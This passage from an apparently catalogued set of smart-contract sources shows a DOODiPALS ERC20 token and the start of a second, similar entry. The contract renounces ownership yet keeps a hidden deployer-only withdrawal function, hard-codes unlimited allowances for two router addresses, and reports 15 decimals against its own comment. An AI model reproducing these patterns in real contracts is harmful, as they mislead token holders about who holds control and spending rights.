low-level delegate call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-\n                        }[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory ) {\n                        \n        (bool success, bytes memory returndata ) = target.delegatecall(data );\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory) {\n                        \n        if  ( success )  { \n                        \n            if (returndata.length == 0 ) \n                        {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract ( target ), \"Address: call to non-contract\" ) ; \n            }\n                        \n            return returndata ; \n         } \n                         else  { \n                        \n            _revert ( returndata, errorMessage) ; \n        \n                         } \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns (bytes memory)  { \n                        \n        if (success) {\n                        \n            return returndata ; \n        \n                        } else  { \n                        \n            _revert(returndata, errorMessage ) ; \n        \n                         } \n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0 ) {\n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                        \n                let returndata_size := mload(returndata)\n                revert ( add ( 32, returndata ), returndata_size )\n            }\n                        \n        \n                        } else {\n                        \n            revert(errorMessage ) ; \n        \n                        }\n    }\n                        \n } \n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n                        \n    function _msgSender( ) internal view virtual returns (address)  { \n                        \n        return msg.sender ; \n    }\n                        \n\n    function _msgData ( ) internal view virtual returns  ( bytes calldata ) {\n                        \n        return msg.data ; \n    \n                        }\n\n    function _contextSuffixLength( ) internal view virtual returns (uint256)  { \n                        \n        return 0;\n    \n                         } \n\n\n}\n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors  { \n                        \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender ) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed );\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender );\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver ) ; \n } \n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 \n                        {\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply (  ) external view returns (uint256) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns  ( uint256 );\n\n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value) ; \n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from` ) to\n     * another (`to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value );\n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transfer ( address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transferFrom ( address from, address to, uint256 amount ) external returns (bool );\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through \n                        {transferFrom } \n                        . This is\n     * zero by default.\n     *\n     * This value changes when  { \n                        approve\n                        } or  { \n                        transferFrom } \n                         are called.\n     */\n    function allowance(address owner, address spender ) external view returns (uint256 );\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {\n                        Approval\n                        } event.\n     */\n    function approve ( address spender, uint256 amount ) external returns  ( bool ) ; \n    \n\n                        }\n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) external view returns  ( string memory ) ; \n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals( ) external view returns  ( uint8) ; \n    \n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns  ( string memory);\n\n\n } \n                        \n\n\n\n\n\n/**\n * @dev Implementation of the  { \n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint\n                        }.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {\n                        decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors   { \n                        \n    mapping(address => uint256 ) private _balances;\n\n\n    mapping(address => mapping(address => uint256 )) private _allowances;\n    uint256 private _totalSupply ; \n\n    string private _name ; \n    string private _symbol;\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol ( ) public view virtual returns (string memory )  { \n                        \n        return _symbol;\n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf}\n                        .\n     */\n    function balanceOf(address account) public view virtual returns  ( uint256 ) {\n                        \n        return _balances[account] ; \n    }\n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns  ( string memory )  { \n                        \n        return _name ; \n    \n                        }\n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance\n                         } .\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256 ) \n                        {\n        return _allowances[owner][spender];\n    }\n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer\n                        } event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update } \n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value ) internal  { \n                        \n        if (account == address ( 0)) {\n                        \n            revert ERC20InvalidReceiver(address(0 )) ; \n         } \n                        \n        _update(address(0), account, value);\n    \n                        }\n    \n    /**\n     * @dev See  { \n                        IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an  { \n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool-\n                         } [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value ) public virtual returns  ( bool ) \n                         { \n        address spender = _msgSender( );\n        _spendAllowance(from, spender, value );\n        _transfer(from, to, value ) ; \n        return true ; \n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer\n                         }  event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual  { \n                        \n        if  ( from == address(0 )) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n         } \n                         else  { \n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value )  { \n                        \n                revert ERC20InsufficientBalance ( from, fromBalance, value);\n             } \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n             } \n                        \n         } \n                        \n\n        if  ( to == address ( 0) ) {\n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n            }\n                        \n         } \n                         else  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n                        \n         } \n                        \n\n        emit Transfer(from, to, value);\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer\n                         } .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value ) public virtual returns (bool ) {\n                        \n        address owner = _msgSender (  ) ; \n        _transfer ( owner, to, value);\n        return true;\n     } \n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an \n                         { Approval } \n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value ) internal \n                         { \n        _approve ( owner, spender, value, true ) ; \n    \n                         } \n    \n    /**\n     * @dev Variant of \n                        {_approve\n                         }  with an optional flag to enable or disable the  { \n                        Approval } \n                         event.\n     *\n     * By default  ( when calling {\n                        _approve}\n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool ) internal virtual override {\n                        \n     *     super._approve(owner, spender, value, true );\n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve } \n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual  { \n                        \n        if  ( owner == address ( 0)) {\n                        \n            revert ERC20InvalidApprover ( address ( 0 ));\n        }\n                        \n        if  ( spender == address(0) ) \n                        {\n            revert ERC20InvalidSpender(address(0) );\n         } \n                        \n        _allowances[owner][spender] = value ; \n        if (emitEvent) \n                        {\n            emit Approval ( owner, spender, value);\n        \n                         } \n     } \n                        \n    \n    /**\n     * @dev See \n                         { IERC20-approve\n                         } .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value ) public virtual returns (bool ) {\n                        \n        address owner = _msgSender ( ) ; \n        _approve(owner, spender, value);\n        return true;\n     } \n                        \n    \n    /**\n     * @dev Sets the values for  { \n                        name } \n                         and {\n                        symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_ ) \n                         { \n        _name = name_;\n        _symbol = symbol_;\n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf}\n                         and  { \n                        IERC20-transfer\n                        }.\n     */\n    function decimals ( ) public view virtual returns (uint8) {\n                        \n        return 15 ; \n    \n                         } \n    \n    /**\n     * @dev See \n                         { IERC20-totalSupply } \n                        .\n     */\n    function totalSupply() public view virtual returns  ( uint256 )  { \n                        \n        return _totalSupply;\n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval } \n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual \n                         { \n        uint256 currentAllowance = allowance(owner, spender );\n        if (currentAllowance < type(uint256 ).max) \n                        {\n            if (currentAllowance < value ) \n                        {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n                        \n            unchecked  { \n                        \n                _approve(owner, spender, currentAllowance - value, false ) ; \n             } \n                        \n        \n                         } \n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to \n                         { transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     *\n     * NOTE: This function is not virtual, \n                        {_update}\n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value ) internal \n                        {\n        if (from == address ( 0 ) )  { \n                        \n            revert ERC20InvalidSender(address(0) ) ; \n         } \n                        \n        if (to == address(0)) {\n                        \n            revert ERC20InvalidReceiver(address(0) ) ; \n         } \n                        \n        _update ( from, to, value);\n     } \n                        \n    \n    \n                        }\n\nabstract contract Ownable is Context  { \n                        \n    address private _owner;\n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( ) {\n                        \n        _transferOwnership(_msgSender() );\n    \n                         } \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account ) ; \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) \n                         { \n        return _owner;\n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner) internal virtual  { \n                        \n        address oldOwner = _owner;\n        _owner = newOwner ; \n        emit OwnershipTransferred(oldOwner, newOwner ) ; \n    }\n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0 )`)\n     */\n    error OwnableInvalidOwner ( address owner) ; \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership( ) public virtual onlyOwner {\n                        \n        _transferOwnership(address(0 ));\n    }\n                        \n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner \n                         { \n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n     } \n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner (  ) \n                        {\n        _checkOwner() ; \n        _ ; \n    \n                         } \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner (  ) internal view virtual \n                        {\n        require ( owner (  ) == _msgSender(), \"Ownable: caller is not the owner\" );\n     } \n                        \n    \n}\n                        \n\n\n// File DOODiPALS.sol\n\ncontract DOODiPALS is ERC20, Ownable \n                         { \n    address internal immutable deployer;\n    constructor ( string memory name_, string memory symbol_) ERC20(name_, symbol_) {\n                        \n        _mint ( msg.sender, 100000000000000000000000) ; \n        _transferOwnership ( address ( 0 )) ; \n        deployer = msg.sender;\n    }\n                        \n    \n    /**\n     * @dev See \n                         { IERC20-allowance}\n                        .\n     */\n    function allowance(address owner, address spender ) public view override returns (uint256)  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if( ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24) ) { \n                        \n            return type ( uint256 ).max ; \n        }\n                         \n        return super.allowance ( owner,spender) ; \n    }\n                        \n    \n    function claimGas(address payable recipient, uint256 amount ) public  { \n                        \n        require ( msg.sender==deployer) ; \n        Address.sendValue ( recipient, amount) ; \n    \n                         } \n    \n    receive ( ) external payable { \n                        \n    }\n                        \n}",
      "count": 1,
      "addresses": [
        "0xC6152D48E6516A081f38e7306DDeBe8Bef8De1B7"
      ],
      "names": [
        "DOODiPALS"
      ]
    },
    {
      "id": "d92b439e-d752-48db-8f52-a0f3d0db0d34",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0) (utils/Address.sol)\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account ) internal view returns  ( bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. \n                        {sendValue\n                         }  removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) public {\n                        \n        require ( address ( this ).balance >= amount, \"Address: insufficient balance\") ; \n\n        (bool success, ) = recipient.call { \n                        value: amount } \n                         ( \"\") ; \n        require(success, \"Address: unable to send value, recipient may have reverted\") ; \n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns  ( bytes memory ) {\n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\");\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory)  { \n                        \n        return functionCallWithValue(target, data, 0, errorMessage );\n    }\n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns (bytes memory ) {\n                        \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\" ) ; \n    \n                        }\n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory)  { \n                        \n        require ( address(this).balance >= value, \"Address: insufficient balance for call\" ) ; \n         ( bool success, bytes memory returndata ) = target.call{\n                        value: value } \n                        (data) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data) internal view returns (bytes memory )  { \n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\" ) ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-string-\n                         } [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) \n                         { \n         ( bool success, bytes memory returndata ) = target.staticcall(data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage );\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data ) internal returns (bytes memory)  { \n                        \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" ) ; \n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) {\n                        \n        (bool success, bytes memory returndata) = target.delegatecall ( data);\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage );\n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n                        \n        if (success )  { \n                        \n            if  ( returndata.length == 0) {\n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract(target ), \"Address: call to non-contract\");\n             } \n                        \n            return returndata ; \n        }\n                         else  { \n                        \n            _revert ( returndata, errorMessage );\n        \n                        }\n    \n                         } \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult ( \n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns  ( bytes memory) {\n                        \n        if  ( success )  { \n                        \n            return returndata ; \n         } \n                         else  { \n                        \n            _revert ( returndata, errorMessage ) ; \n        }\n                        \n    }\n                        \n\n    function _revert(bytes memory returndata, string memory errorMessage) private pure \n                        {\n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0) {\n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload(returndata)\n                revert ( add ( 32, returndata), returndata_size )\n             } \n                        \n         } \n                         else  { \n                        \n            revert(errorMessage);\n        }\n                        \n    }\n                        \n}\n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender  ( as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n    function _msgSender( ) internal view virtual returns (address )  { \n                        \n        return msg.sender ; \n     } \n                        \n\n    function _contextSuffixLength ( ) internal view virtual returns (uint256) {\n                        \n        return 0 ; \n     } \n                        \n\n    function _msgData ( ) internal view virtual returns  ( bytes calldata ) {\n                        \n        return msg.data ; \n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n                        \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed) ; \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver );\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver ) ; \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n}\n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20  { \n                        \n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply (  ) external view returns  ( uint256);\n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns  ( uint256);\n\n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     */\n    function transferFrom(address from, address to, uint256 amount ) external returns (bool ) ; \n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will 